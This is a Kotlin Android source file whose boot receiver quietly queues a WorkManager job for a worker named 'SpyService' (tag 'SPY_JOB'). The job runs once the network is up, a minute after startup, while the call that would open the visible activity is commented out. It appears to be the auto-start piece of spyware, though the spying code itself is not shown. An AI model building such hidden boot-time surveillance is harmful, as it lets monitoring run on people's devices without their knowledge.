package com.example.background

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.lifecycle.lifecycleScope
import androidx.work.Constraints
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class BootReciever : BroadcastReceiver() {

    private val TAG = "BootReceiver"

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "Получено событие: ${intent.action}")

        if (Intent.ACTION_BOOT_COMPLETED == intent.action) {
            Log.d(TAG, "Система загружена, запуск приложения")

            try {
                //startMainActivity(context)
                startTask()
            } catch (e: Exception) {
                e.message?.let { Log.d(TAG, it) }
            }
        }
    }

    private fun startMainActivity(context: Context) {
        val intent = Intent(context, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)

            putExtra("auto_start", true)
            putExtra("start_time", System.currentTimeMillis())
        }

        context.startActivity(intent)
        Log.d(TAG, "Активность запущена")
    }

    private fun startTask() {
        val constraints = Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()

            val quickWorkRequest = OneTimeWorkRequestBuilder<SpyService>()
                .addTag("SPY_JOB")
                .setConstraints(constraints)
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()

            WorkManager.getInstance().enqueue(quickWorkRequest)

    }
}